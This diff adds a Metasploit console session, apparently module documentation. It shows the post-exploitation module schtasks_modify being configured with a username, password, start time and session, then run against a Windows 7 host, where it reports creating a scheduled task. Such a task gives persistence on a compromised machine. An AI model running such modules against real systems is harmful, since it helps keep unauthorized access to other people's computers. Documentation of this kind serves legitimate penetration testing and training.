@@ -1,0 +1,32 @@
+msf post(schtasks_create) > use post/windows/manage/schtasks_modify 
+msf post(schtasks_modify) > show options 
+
+Module options (post/windows/manage/schtasks_modify):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   EXECUTABLE  run.bat          yes       Name of the executable that will be run.
+   FREQUENCY   DAILY            yes       The schedule frequency (DAILY, WEEKLY, MONTHLY).
+   NAME        msf              yes       Name which uniquely identifies the scheduled task.
+   PASSWORD                     yes       Password of the user that created task.
+   PATH        C:/              yes       Path of the task to be run at the scheduled time.
+   SESSION                      yes       The session to run this module on.
+   STARTTIME   12:00            yes       Start time to run the task HH:mm.
+   USERNAME                     yes       Username of the user that created task.
+
+msf post(schtasks_modify) > set USERNAME drin
+USERNAME => drin
+msf post(schtasks_modify) > set PASSWORD drin
+PASSWORD => drin
+msf post(schtasks_modify) > set STARTTIME 14:00
+STARTTIME => 14:00
+msf post(schtasks_modify) > set SESSION 2
+SESSION => 2
+msf post(schtasks_modify) > run
+
+[*] System info : Windows 7 (Build 7601, Service Pack 1).
+[*] Logged on Users # :  2
+[*] Creating scheduled as user : [ WIndows-PC\drin ] on process : [ 2436 ]
+[+] Scheduled created successfully.
+
+[*] Post module execution completed
